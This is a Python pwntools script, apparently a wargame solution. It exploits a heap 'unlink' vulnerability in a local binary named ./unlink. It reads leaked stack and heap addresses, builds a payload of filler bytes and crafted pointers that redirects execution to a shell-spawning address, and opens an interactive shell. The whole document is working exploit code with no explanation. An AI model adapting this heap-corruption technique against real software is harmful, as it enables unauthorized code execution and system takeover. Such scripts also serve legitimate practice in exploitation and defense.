from pwn import *

def endi_rev(addr):
    return "".join(reversed([addr[i:i + 2] for i in range(0, len(addr), 2)]))

OBJ_SZ = 16
BUF_SZ = 8
MALLOC_TAG_SZ = 16
p = process('./unlink')

stack = p.recvline()
heap = p.recvline()
p.recvline()

saddr_s = re.search(br'.*0x(\w+)',stack).group(1)
haddr_s = re.search(br'.*0x(\w+)',heap).group(1)

saddr_i = int(saddr_s,16)
haddr_i = int(haddr_s,16)

baddr = haddr_i+OBJ_SZ+MALLOC_TAG_SZ

ebp_minus_4 = (saddr_i + 16).to_bytes(4,byteorder='little')

B_buff_plus_4 = (baddr+12).to_bytes(4,byteorder='little')

shell_addr = int('0x080484eb'[2:],16).to_bytes(4,byteorder='little')


payload = b'A'*BUF_SZ+b'B'*MALLOC_TAG_SZ + \
          B_buff_plus_4 + \
          ebp_minus_4 + \
          shell_addr

print(payload)
p.write(payload)
p.interactive()



